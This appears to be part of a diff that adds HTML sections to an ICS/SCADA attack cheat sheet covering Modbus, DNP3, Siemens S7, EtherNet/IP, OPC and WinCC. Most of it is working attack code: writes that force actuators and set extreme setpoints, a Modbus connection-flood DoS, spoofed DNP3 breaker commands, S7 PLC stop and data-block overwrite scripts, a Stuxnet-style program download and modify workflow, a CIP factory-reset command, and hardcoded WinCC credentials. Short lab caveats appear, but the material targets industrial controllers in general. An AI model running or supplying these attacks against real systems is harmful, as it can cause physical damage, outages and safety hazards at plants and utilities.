+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">🔬 Redpoint / PLCScan</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">plcscan — dedicated PLC scanner</div>
+              <div class="cmd-code">python3 plcscan.py -t 192.168.1.0/24</div>
+              <div class="cmd-explain">PLCScan uses multiple ICS protocols (Modbus, S7, EtherNet/IP) to identify PLCs. Lightweight and purpose-built — better signal-to-noise than nmap for ICS assets. Written in Python.</div>
+            </div>
+            <div class="cmd-block">
+              <div class="cmd-label">redpoint NSE scripts (nmap)</div>
+              <div class="cmd-code">git clone https://github.com/digitalbond/Redpoint
+cp Redpoint/*.nse /usr/share/nmap/scripts/
+nmap --script-updatedb
+
+# Scan with Redpoint
+nmap -sV --script bacnet-info \
+  -p 47808 -sU 192.168.1.0/24</div>
+              <div class="cmd-explain">Digital Bond's Redpoint adds BACnet, HART, DNP3, and more to nmap's ICS arsenal. Essential additions. <span class="flag">bacnet-info</span> reads device name, vendor, model from BACnet building automation systems without any auth.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══════════ SECTION 4: PROTOCOL SCANNING ══════════ -->
+    <section class="section" id="s4">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(255,215,0,0.1)">📶</div>
+        <div>
+          <div class="section-title">Protocol-Level Scanning & Enumeration</div>
+          <div class="section-sub">Deep-dive per protocol — what can you read before exploiting</div>
+        </div>
+        <span class="difficulty-tag" style="background:rgba(255,215,0,0.1);color:#ffd700;border:1px solid rgba(255,215,0,0.3)">MID</span>
+      </div>
+
+      <div class="card-grid">
+        <div class="card">
+          <div class="card-head"><span class="card-title"><span class="proto proto-modbus">Modbus</span> Enumeration</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">mbtget — read Modbus registers</div>
+              <div class="cmd-code"># Read 10 holding registers from address 0
+mbtget -r 1 -n 10 192.168.1.10
+
+# Read coils (binary outputs: valve open/closed)
+mbtget -r 0 -a 0 -n 100 192.168.1.10
+
+# Read input registers (sensor values)
+mbtget -r 3 -a 0 -n 20 192.168.1.10
+
+# Read device ID (function code 43)
+mbtget -i 192.168.1.10</div>
+              <div class="cmd-explain">Modbus has 4 data areas: <b>Coils</b> (r=0, binary R/W = actuators), <b>Discrete Inputs</b> (r=1, binary R = sensors), <b>Input Registers</b> (r=3, analog R = measurements), <b>Holding Registers</b> (r=1 with flag, analog R/W = setpoints). <span class="flag">-n 100</span> = read 100 values. These are your process values — you can see if valves are open, what temperature is, etc.</div>
+            </div>
+            <div class="cmd-block">
+              <div class="cmd-label">python pymodbus — manual Modbus queries</div>
+              <div class="cmd-code">python3 -c "
+from pymodbus.client import ModbusTcpClient
+c = ModbusTcpClient('192.168.1.10', port=502)
+c.connect()
+# Read holding registers 0-9
+r = c.read_holding_registers(0, count=10, slave=1)
+print(r.registers)
+# Read coils
+r2 = c.read_coils(0, count=10, slave=1)
+print(r2.bits)
+c.close()
+"</div>
+              <div class="cmd-explain"><b>slave=1</b> is the Modbus unit ID (device address 1-247). Some devices use a specific unit ID — try 1, then 0, then 255 if you get no response. <b>r.registers</b> = list of 16-bit integer values. Coils return boolean bits (True = ON = valve/motor running).</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title"><span class="proto proto-s7">S7comm</span> Enumeration</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">snap7 / python-snap7 — read Siemens PLC</div>
+              <div class="cmd-code">python3 -c "
+import snap7
+plc = snap7.client.Client()
+plc.connect('192.168.1.20', 0, 1)  
+# (ip, rack, slot) — try rack=0,slot=1 for most S7-300
+
+info = plc.get_cpu_info()
+print(info)
+
+# Read data block 1, starting byte 0, 10 bytes
+data = plc.db_read(1, 0, 10)
+print(data)
+
+# Read inputs (I area)
+inputs = plc.read_area(snap7.types.Areas.PE, 0, 0, 1)
+print(inputs)
+plc.disconnect()
+"</div>
+              <div class="cmd-explain"><b>rack</b> and <b>slot</b> identify the CPU module in the Siemens rack. S7-300 is usually rack=0, slot=2. S7-1200/1500 is rack=0, slot=1. <b>db_read(db_num, start, size)</b> = read Data Block — this is where the PLC stores process variables. <b>Areas.PE</b> = process inputs (physical sensors reading), <b>Areas.PA</b> = process outputs (what's actually being sent to actuators).</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title"><span class="proto proto-enip">EtherNet/IP</span> Enumeration</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">cpppo — CIP tag browsing</div>
+              <div class="cmd-code">pip3 install cpppo
+
+# List all tags on Allen-Bradley PLC
+python3 -m cpppo.server.enip.list_services \
+  --address 192.168.1.30:44818
+
+# Read a specific tag
+python3 -m cpppo.server.enip.client \
+  --address 192.168.1.30 \
+  'Tag1' 'BOOL_Tag' 'INT_Register'
+
+# Use EtherNet/IP scanner
+python3 -m cpppo.server.enip.get_attribute \
+  --address 192.168.1.30 \
+  '@1/1/7'  # Identity Object, Instance 1, Attr 7 = Product Name</div>
+              <div class="cmd-explain"><b>EtherNet/IP uses CIP (Common Industrial Protocol)</b> with named "tags" — no numeric address like Modbus. <span class="flag">@1/1/7</span> notation = Class 1 (Identity), Instance 1, Attribute 7. The Identity Object gives you vendor, product name, serial number — perfect for fingerprinting Allen-Bradley devices without authentication.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title"><span class="proto proto-dnp3">DNP3</span> Enumeration</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">scapy — craft DNP3 probe packets</div>
+              <div class="cmd-code">python3 -c "
+from scapy.all import *
+from scapy.contrib.dnp3 import *
+
+# Send DNP3 data link frame to enumerate device
+pkt = IP(dst='192.168.1.40')/TCP(dport=20000)/\
+  DNP3()/DNP3Transport()/DNP3ApplicationRequest()\
+  /DNP3RequestReadAllObjects()
+
+resp = sr1(pkt, timeout=3)
+resp.show()
+"
+
+# Or use OpenDNP3 tools
+git clone https://github.com/automatak/dnp3
+# Build and use dnp3demo to connect as master</div>
+              <div class="cmd-explain">DNP3 uses a <b>master-outstation model</b>. You act as the "master" (SCADA), they are the "outstation" (RTU). <b>Data Link Frame</b> has source/dest addresses (0-65534). Read All Objects = ask outstation to report all its data points — voltage, current, breaker status, etc. Completely unauthenticated by default.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══════════ SECTION 5: FINGERPRINTING ══════════ -->
+    <section class="section" id="s5">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(255,215,0,0.1)">🧬</div>
+        <div>
+          <div class="section-title">Device Fingerprinting & Asset Identification</div>
+          <div class="section-sub">Identify vendor, model, firmware — build your target profile</div>
+        </div>
+        <span class="difficulty-tag" style="background:rgba(255,215,0,0.1);color:#ffd700;border:1px solid rgba(255,215,0,0.3)">MID</span>
+      </div>
+
+      <div class="card-grid">
+        <div class="card">
+          <div class="card-head"><span class="card-title">🏷️ Modbus Device Identification (FC43)</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">modbus function code 43 — device ID</div>
+              <div class="cmd-code">python3 -c "
+from pymodbus.client import ModbusTcpClient
+from pymodbus.mei_message import ReadDeviceInformationRequest
+
+c = ModbusTcpClient('192.168.1.10')
+c.connect()
+req = ReadDeviceInformationRequest(0x01, slave=1)
+resp = c.execute(req)
+print('Vendor:',  resp.information[0])
+print('Product:', resp.information[1])
+print('Version:', resp.information[2])
+c.close()
+"</div>
+              <div class="cmd-explain">Modbus Function Code 43 (0x2B) with MEI type 0x0E = "Read Device Identification." Returns <b>VendorName, ProductCode, MajorMinorRevision</b>. Tells you exactly what PLC/RTU model you're dealing with — then search CVEs for that specific version. This is totally unauthenticated.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">🔎 Web Interface Discovery</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">many PLCs run embedded web servers</div>
+              <div class="cmd-code"># Scan for web interfaces on ICS devices
+nmap -sV -p 80,443,8080,8443 \
+  --max-rate 5 192.168.1.0/24
+
+# Look for common ICS web interface paths
+curl -s http://192.168.1.10/main.html
+curl -s http://192.168.1.10/diag.htm
+curl -s http://192.168.1.10/plc/
+
+# Check for default creds (very common)
+# admin:admin, admin:password, 
+# Administrator:(blank), user:user</div>
+              <div class="cmd-explain">Many PLCs (Schneider Modicon, WAGO, Beckhoff, Phoenix Contact) have embedded web servers for configuration. Default credentials are <b>rampant in ICS</b> — vendors ship with admin/admin, nobody changes them. Once in the web UI, you can upload modified PLC programs or change setpoints directly.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">📊 Metasploit ICS Modules</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">msf — ICS auxiliary scanners</div>
+              <div class="cmd-code">msfconsole
+
+# List all ICS modules
+search type:auxiliary ICS
+search type:auxiliary SCADA
+search type:auxiliary modbus
+
+# Modbus client
+use auxiliary/scanner/scada/modbus_findunitid
+set RHOSTS 192.168.1.10
+set RPORT 502
+run
+
+# S7 scanner
+use auxiliary/scanner/scada/siemens_s7_300
+set RHOSTS 192.168.1.0/24
+run
+
+# EtherNet/IP
+use auxiliary/scanner/scada/profinet_simatic_disclaim
+run</div>
+              <div class="cmd-explain">MSF has a dedicated set of ICS modules. <b>modbus_findunitid</b> brute-forces the Modbus Unit ID (1-247) since some devices don't respond on ID 1 — it tries all and reports which one answers. Essential first step before reading registers.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══════════ SECTION 6: MODBUS ATTACKS ══════════ -->
+    <section class="section" id="s6">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(255,107,53,0.1)">⚡</div>
+        <div>
+          <div class="section-title">Modbus Protocol Attacks</div>
+          <div class="section-sub">The most common ICS protocol — zero auth, full read/write</div>
+        </div>
+        <span class="difficulty-tag" style="background:rgba(255,107,53,0.1);color:#ff6b35;border:1px solid rgba(255,107,53,0.3)">MID</span>
+      </div>
+
+      <div class="info-box info-orange">
+        <strong>Logic: Why Modbus is low-hanging fruit</strong>
+        Modbus was designed in 1979 for serial comms in isolated environments. Security was never a concern. When mapped to TCP/IP, it brings ZERO authentication, ZERO encryption, and ZERO authorization. Anyone who can reach port 502 can read every sensor and write every actuator output. This is why it's almost always the first protocol you exploit in lab scenarios.
+      </div>
+
+      <div class="card-grid">
+        <div class="card">
+          <div class="card-head"><span class="card-title">📖 Reading Process Values</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">read ALL Modbus data areas</div>
+              <div class="cmd-code">python3 << 'EOF'
+from pymodbus.client import ModbusTcpClient
+
+c = ModbusTcpClient('192.168.1.10', port=502)
+c.connect()
+
+# Coils (0x = digital outputs — valves, motors, relays)
+coils = c.read_coils(address=0, count=100, slave=1)
+print("COILS:", coils.bits[:100])
+
+# Discrete Inputs (1x = digital inputs — switches, sensors)
+di = c.read_discrete_inputs(address=0, count=100, slave=1)
+print("DISC INPUTS:", di.bits[:100])
+
+# Input Registers (3x = analog inputs — temp, pressure, flow)
+ir = c.read_input_registers(address=0, count=30, slave=1)
+print("INPUT REGS:", ir.registers)
+
+# Holding Registers (4x = config setpoints, R/W)
+hr = c.read_holding_registers(address=0, count=30, slave=1)
+print("HOLDING REGS:", hr.registers)
+
+c.close()
+EOF</div>
+              <div class="cmd-explain">This is your <b>complete process snapshot</b>. Coils = what actuators are doing right now (valve: True=open, False=closed). Input registers = raw sensor readings (divide by 10 or 100 to get engineering units — varies by device). Holding registers = <b>the dangerous ones</b> — these are setpoints you can overwrite.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">✍️ Writing / Manipulating Process</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">write coil — force actuator state</div>
+              <div class="cmd-code">python3 -c "
+from pymodbus.client import ModbusTcpClient
+c = ModbusTcpClient('192.168.1.10')
+c.connect()
+
+# Force coil 0 to TRUE (open valve / start motor)
+c.write_coil(0, True, slave=1)
+
+# Force coil 0 to FALSE (close valve / stop motor)
+c.write_coil(0, False, slave=1)
+
+# Write multiple coils at once
+c.write_coils(0, [True,False,True,True], slave=1)
+c.close()
+"</div>
+              <div class="cmd-explain"><b>This directly controls physical outputs</b>. Coil 0 might be Pump 1, Coil 1 might be Valve A, etc. <span class="hl-warn">In a real plant, this can cause physical damage.</span> In labs: this is how you demonstrate impact — show that you can start/stop processes. The write takes effect immediately on the PLC output.</div>
+            </div>
+            <div class="cmd-block">
+              <div class="cmd-label">write register — change setpoint</div>
+              <div class="cmd-code">python3 -c "
+from pymodbus.client import ModbusTcpClient
+c = ModbusTcpClient('192.168.1.10')
+c.connect()
+
+# Change holding register 0 to value 9999
+# (e.g., overpressure setpoint, temp limit, speed)
+c.write_register(0, 9999, slave=1)
+
+# Write multiple registers  
+c.write_registers(0, [100, 200, 300], slave=1)
+c.close()
+"</div>
+              <div class="cmd-explain">Holding registers store <b>process setpoints</b> — the target temperature, max pressure alarm threshold, motor speed, flow rate target. Setting them to extreme values (9999, 0, 65535) can trigger unsafe conditions or disable safety alarms while the process continues running dangerously.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">🔄 Modbus Fuzzing</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">msf — modbus function code fuzzer</div>
+              <div class="cmd-code">use auxiliary/fuzzer/modbus/modbus_request
+set RHOSTS 192.168.1.10
+set RPORT 502
+set UNIT_ID 1
+set START_FC 1    # start function code
+set END_FC 127    # end function code
+run</div>
+              <div class="cmd-explain">Modbus defines function codes 1-127. Many PLCs implement undocumented or vendor-specific ones beyond the standard 1-6,15,16. Fuzzing all function codes can reveal hidden diagnostic modes, unlock write access to normally read-only areas, or crash the PLC (DoS). <span class="hl-warn">Crash risk — only in lab.</span></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">💀 Modbus DoS</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">flood Modbus connections (DoS)</div>
+              <div class="cmd-code">python3 -c "
+from pymodbus.client import ModbusTcpClient
+import threading
+
+def flood():
+    while True:
+        try:
+            c = ModbusTcpClient('192.168.1.10')
+            c.connect()
+            c.read_holding_registers(0, 125, slave=1)
+            c.close()
+        except: pass
+
+# Many PLCs have max 8-16 concurrent TCP connections
+# Flooding exhausts the connection table
+threads = [threading.Thread(target=flood) for _ in range(50)]
+for t in threads: t.start()
+"</div>
+              <div class="cmd-explain">Many PLCs have a <b>very small TCP connection table</b> (8-32 connections max). Flooding with connection requests exhausts the table — legitimate SCADA can no longer connect. This is <b>Loss of Control</b> — operators lose the ability to remotely manage the PLC. The PLC keeps running its last program, which may or may not be safe.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══════════ SECTION 7: DNP3 ══════════ -->
+    <section class="section" id="s7">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(255,107,53,0.1)">🌊</div>
+        <div>
+          <div class="section-title">DNP3 Attacks</div>
+          <div class="section-sub">Power grid & water utility protocol — substation exploitation</div>
+        </div>
+        <span class="difficulty-tag" style="background:rgba(255,107,53,0.1);color:#ff6b35;border:1px solid rgba(255,107,53,0.3)">MID</span>
+      </div>
+
+      <div class="card-grid">
+        <div class="card">
+          <div class="card-head"><span class="card-title">📡 DNP3 Recon & Enumeration</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">nmap dnp3 probe</div>
+              <div class="cmd-code">nmap -sV --script dnp3-info \
+  -p 20000 192.168.1.0/24 \
+  --max-rate 5</div>
+              <div class="cmd-explain">DNP3 devices announce their <b>device attributes</b> in response to a Data Link Status request. This leaks: vendor name, product name, device serial number, firmware version, supported function codes. All without authentication.</div>
+            </div>
+            <div class="cmd-block">
+              <div class="cmd-label">msf — DNP3 scanner</div>
+              <div class="cmd-code">use auxiliary/scanner/scada/dnp3_enumeration
+set RHOSTS 192.168.1.40
+set RPORT 20000
+set MASTER_ADDRESS 3  # our source addr
+set STATION_ADDRESS 1 # target RTU addr
+run</div>
+              <div class="cmd-explain">DNP3 uses <b>link-layer addresses</b> (0-65519). MASTER_ADDRESS is "us" (pick any number not used on the network). STATION_ADDRESS is the RTU/outstation. If you don't know the station address, enumerate 1-255 systematically.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">⚡ DNP3 Spoofed Command Injection</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">scapy — craft malicious DNP3 operate</div>
+              <div class="cmd-code">python3 -c "
+from scapy.all import *
+from scapy.contrib.dnp3 import *
+
+# Impersonate the master SCADA
+# Send 'Direct Operate' to trip a breaker (CROB command)
+# FC 3 = Direct Operate, Code 0x41 = Latch On
+pkt = (
+  Ether()/IP(dst='192.168.1.40')/
+  TCP(dport=20000)/
+  DNP3(src=3, dst=1)/  # src=master, dst=RTU
+  DNP3Transport(fin=1, fir=1)/
+  DNP3ApplicationRequest(
+    fc=0x03,  # Direct Operate
+  )
+)
+send(pkt)
+"</div>
+              <div class="cmd-explain">DNP3's default mode has <b>no authentication</b>. An attacker on the same network segment can spoof being the SCADA master and send control commands directly to RTUs. <b>CROB (Control Relay Output Block)</b> = the command object for controlling digital outputs (breakers, valves). FC=0x03 = Direct Operate — no confirmation required, immediate action.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══════════ SECTION 8: SIEMENS S7 ══════════ -->
+    <section class="section" id="s8">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(255,71,87,0.1)">🤖</div>
+        <div>
+          <div class="section-title">Siemens S7 / S7comm Attacks</div>
+          <div class="section-sub">The Stuxnet protocol — control the world's most deployed industrial PLC</div>
+        </div>
+        <span class="difficulty-tag" style="background:rgba(255,71,87,0.1);color:#ff4757;border:1px solid rgba(255,71,87,0.3)">ADVANCED</span>
+      </div>
+
+      <div class="info-box info-red">
+        <strong>🦠 Stuxnet Context</strong>
+        Stuxnet (2010) exploited S7comm to reprogram Siemens S7-315 PLCs controlling uranium centrifuges at Natanz, Iran. It wrote a rootkit into the PLC that reported "all normal" to the HMI while sending centrifuges to destructive speeds. This exact attack surface still exists in unpatched systems today.
+      </div>
+
+      <div class="card-grid">
+        <div class="card">
+          <div class="card-head"><span class="card-title">🔍 S7 Enumeration</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">snap7 — full S7 enumeration</div>
+              <div class="cmd-code">python3 << 'EOF'
+import snap7
+
+plc = snap7.client.Client()
+plc.connect('192.168.1.20', 0, 1)
+
+# CPU info — model, serial, OS version
+info = plc.get_cpu_info()
+print("Module:", info.ModuleTypeName.decode())
+print("Serial:", info.SerialNumber.decode())
+print("ASName:", info.ASName.decode())  # Project name!
+
+# CPU state — RUN/STOP/ERROR
+state = plc.get_cpu_state()
+print("CPU State:", state)  
+
+# List data blocks
+# Try DB 1 through DB 100
+for db in range(1, 101):
+    try:
+        data = plc.db_read(db, 0, 4)
+        print(f"DB{db} exists: {data.hex()}")
+    except: pass
+
+plc.disconnect()
+EOF</div>
+              <div class="cmd-explain">S7's <b>ASName</b> is the project name programmed by the engineer — can reveal the plant name, project ID, even engineer name. <b>CPU state</b>: RUN = PLC is actively controlling. STOP = safe mode, program paused. If you can put the PLC in STOP mode remotely, that's an immediate <b>Loss of Control</b> event. Data Blocks (DB1-DB100+) contain all process variables and setpoints.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">✍️ S7 Read / Write Data Blocks</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">read and write DB values</div>
+              <div class="cmd-code">python3 -c "
+import snap7, struct
+
+plc = snap7.client.Client()
+plc.connect('192.168.1.20', 0, 1)
+
+# Read DB1, byte 0, 20 bytes
+raw = plc.db_read(1, 0, 20)
+
+# Interpret as REAL (float) at offset 0
+temp = struct.unpack('>f', raw[0:4])[0]
+print(f'Temperature: {temp:.2f}°C')
+
+# Interpret as INT at offset 4
+speed = struct.unpack('>h', raw[4:6])[0]
+print(f'Motor Speed: {speed} RPM')
+
+# WRITE — change setpoint to dangerous value
+# DB1, start byte 4, data = 9000 (overrev motor)
+new_val = struct.pack('>h', 9000)
+plc.db_write(1, 4, new_val)
+
+plc.disconnect()
+"</div>
+              <div class="cmd-explain">S7 uses <b>big-endian byte order</b> for all values. Types: BOOL (1 bit), BYTE (1 byte), INT (2 bytes signed), DINT (4 bytes signed), REAL (4 bytes float). The <span class="flag">struct.unpack</span> format depends on what type you're reading — you need to know the DB layout (found in the PLC project, or guessed from context). <b>db_write</b> with an extreme value manipulates the process directly.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">⏹️ CPU Stop — Loss of Control</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">send PLC to STOP state</div>
+              <div class="cmd-code">python3 -c "
+import snap7
+
+plc = snap7.client.Client()
+plc.connect('192.168.1.20', 0, 1)
+
+# Put PLC in STOP mode — halts all outputs
+# On real plant: all actuators go to fail-safe state
+# Depending on config, valves may slam open or closed!
+plc.plc_stop()
+
+print('PLC stopped!')
+
+# Restart PLC (cold start = clears all I/O)
+plc.plc_cold_start()
+
+plc.disconnect()
+"</div>
+              <div class="cmd-explain"><b>plc_stop()</b> sends S7 function 0x29 "Stop PLC." The PLC halts program execution — all outputs go to their configured fail-safe state. For manufacturing, this stops production. For infrastructure, this is potentially catastrophic — depends on whether fail-safe opens or closes critical valves. <span class="hl-warn">Most dangerous command you can send.</span></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">💾 Upload / Download PLC Program</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">msf — S7 program download (Stuxnet-style)</div>
+              <div class="cmd-code">use auxiliary/admin/scada/siemens_s7_300_400_plc
+set RHOSTS 192.168.1.20
+set ACTION UPLOAD     # download PLC code from device
+run
+
+# Download returns the compiled PLC program
+# Analyze offline, find logic, modify, re-upload
+# This is the Stuxnet attack pattern:
+# 1) Download legit program
+# 2) Modify to add malicious logic
+# 3) Upload modified program
+# 4) PLC runs modified code, HMI shows old values</div>
+              <div class="cmd-explain">S7 older models (S7-300/400) allow unauthenticated program upload/download via the protocol. S7-1200/1500 added encryption but has known bypasses. <b>This is the crown jewel attack</b> — modify the PLC logic itself while the HMI continues showing normal readings (just like Stuxnet). On lab systems this is safe to practice.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══════════ SECTION 9: EtherNet/IP ══════════ -->
+    <section class="section" id="s9">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(255,71,87,0.1)">🔌</div>
+        <div>
+          <div class="section-title">EtherNet/IP & CIP Attacks</div>
+          <div class="section-sub">Allen-Bradley / Rockwell — America's most deployed PLC platform</div>
+        </div>
+        <span class="difficulty-tag" style="background:rgba(255,71,87,0.1);color:#ff4757;border:1px solid rgba(255,71,87,0.3)">ADVANCED</span>
+      </div>
+
+      <div class="card-grid">
+        <div class="card">
+          <div class="card-head"><span class="card-title">🏷️ CIP Tag Read / Write</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">cpppo — read/write named PLC tags</div>
+              <div class="cmd-code">python3 << 'EOF'
+import cpppo
+from cpppo.server.enip import client
+
+# Connect to Allen-Bradley PLC
+with client.connector(host='192.168.1.30') as conn:
+    
+    # Read tags (must know tag names)
+    operations = [
+        {'method': 'read', 'path': [{'symbolic': 'MotorSpeed'}]},
+        {'method': 'read', 'path': [{'symbolic': 'Pressure_PV'}]},
+        {'method': 'read', 'path': [{'symbolic': 'Valve_State'}]},
+    ]
+    
+    for op, _, _, data, path, send in conn.pipeline(
+            operations=operations, depth=5, multiple=True, timeout=3):
+        print(f"{path}: {data}")
+    
+    # Write a tag — change setpoint
+    ops_write = [
+        {'method': 'write', 
+         'path': [{'symbolic': 'MaxPressure'}],
+         'data': [999.0], 'tag_type': 'REAL'}
+    ]
+EOF</div>
+              <div class="cmd-explain">Allen-Bradley PLCs use <b>symbolic tags</b> (named variables like "Valve_State") instead of numeric addresses. You need to know tag names — get them by browsing via RSLogix software, through the EDS file, or by guessing common names. <b>Once you have tag names, you have complete read/write access</b> with no auth required in most configurations.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">💣 CIP Reset / Firmware</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">msf — EtherNet/IP device reset</div>
+              <div class="cmd-code">use auxiliary/admin/scada/multi_cip_command
+set RHOSTS 192.168.1.30
+set RPORT 44818
+set COMMAND RESET    # factory reset PLC!
+run
+
+# Also try:
+# COMMAND LIST_TAGS   — list all tag names
+# COMMAND GET_ATTR    — get device attributes
+# COMMAND RESET_MINOR — soft reset
+
+# UDP broadcast discovery (port 2222)
+use auxiliary/scanner/scada/enip_listservices
+set RHOSTS 192.168.1.255
+set RPORT 2222
+run</div>
+              <div class="cmd-explain">CIP's <b>Reset service (0x05)</b> sends a "Reset" to the Identity Object. Some PLCs interpret this as a full factory reset — <span class="hl-warn">destroys the PLC program and all config.</span> Even a soft reset (reboot) causes a brief Loss of Control. The UDP broadcast on 2222 is used for discovery — devices respond with their identity even from behind NAT on the same subnet.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══════════ SECTION 10: OPC ══════════ -->
+    <section class="section" id="s10">
+      <div class="section-header">
+        <div class="section-icon" style="background:rgba(255,71,87,0.1)">🪟</div>
+        <div>
+          <div class="section-title">OPC / WinCC / HMI Attacks</div>
+          <div class="section-sub">Attack the Windows layer that sits above the PLC</div>
+        </div>
+        <span class="difficulty-tag" style="background:rgba(255,71,87,0.1);color:#ff4757;border:1px solid rgba(255,71,87,0.3)">ADVANCED</span>
+      </div>
+
+      <div class="card-grid">
+        <div class="card">
+          <div class="card-head"><span class="card-title">🪟 OPC-DA via DCOM</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">impacket — enumerate OPC via DCOM (port 135)</div>
+              <div class="cmd-code"># OPC-DA runs over DCOM — classic Windows RPC
+# Port 135 = DCOM endpoint mapper
+
+# Enumerate DCOM services
+python3 /opt/impacket/examples/dcomexec.py \
+  -object MMC20 \
+  DOMAIN/user:password@192.168.1.50 cmd
+
+# Or use rpcdump to find OPC endpoints
+python3 /opt/impacket/examples/rpcdump.py \
+  192.168.1.50 | grep -i opc
+
+# OPC server GUIDs to look for:
+# {76A6415B-CB41-11d1-8B02-00600806D9B6} = OPC DA 2.0
+# {63D5F432-CFE4-11d1-B2C8-0060083BA1FB} = OPC DA 3.0</div>
+              <div class="cmd-explain">OPC-DA (Data Access) runs over Microsoft DCOM — same infrastructure as many Windows RPC exploits. Find OPC servers via the endpoint mapper on port 135. Once you identify the OPC server GUID, you can connect as an OPC client and read/write all PLC tags through the SCADA software — bypassing the PLC protocol entirely and going through the HMI's data pathway.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">🔓 WinCC Default Credentials</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">common Siemens WinCC default creds</div>
+              <div class="cmd-code"># WinCC MSSQL database default creds
+# (WinCC stores all SCADA config in SQL Server!)
+# Username: WinCCConnect
+# Password: 2WSXcder  (this was hardcoded!)
+
+# Try with mssqlclient
+python3 /opt/impacket/examples/mssqlclient.py \
+  WinCCConnect:2WSXcder@192.168.1.50
+
+# Query the WinCC tag database
+SELECT * FROM Runtime.dbo.PDE#Variables
+SELECT * FROM CC_OS1..PDE#Alarms
+
+# Also try WinCC web interface
+# http://192.168.1.50/WinCCWebNavigator/
+# Default: Administrator / (empty password)</div>
+              <div class="cmd-explain">Siemens WinCC SCADA ships with a hardcoded MSSQL database password (<b>2WSXcder</b>) — <b>this was literally hardcoded in WinCC versions before 7.0 SP3</b> and was one of the Stuxnet attack vectors. The WinCC SQL database contains the complete SCADA tag list, alarm configuration, historical data, and operator accounts. Accessing it gives full view of the entire process.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><span class="card-title">📊 OPC-UA Exploitation</span></div>
+          <div class="card-body">
+            <div class="cmd-block">
+              <div class="cmd-label">opcua-client / freeopcua — enumerate OPC-UA</div>
+              <div class="cmd-code">pip3 install opcua
+
+python3 << 'EOF'
+from opcua import Client
+
+c = Client("opc.tcp://192.168.1.60:4840/")
+
+# Try anonymous connect first (often allowed!)
+c.connect()
+root = c.get_root_node()
+
+# Browse all nodes
+def browse(node, depth=0):
+    for child in node.get_children():
+        try:
+            print("  "*depth + str(child.get_browse_name()))
+            browse(child, depth+1)
+        except: pass
+
+browse(root)
+
+# Read a specific node value
+node = c.get_node("ns=2;i=1003")  # namespace=2, id=1003
+print(node.get_value())
+
+c.disconnect()
+EOF</div>
+              <div class="cmd-explain">OPC-UA was designed with security (unlike OPC-DA) but is often deployed with <b>anonymous access enabled</b> — the worst of both worlds. Anonymous access = anyone can browse and read the entire tag hierarchy. <b>ns=2;i=1003</b> is a NodeId — namespace 2 is usually the custom tag namespace. Browsing the tree reveals the entire plant topology.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
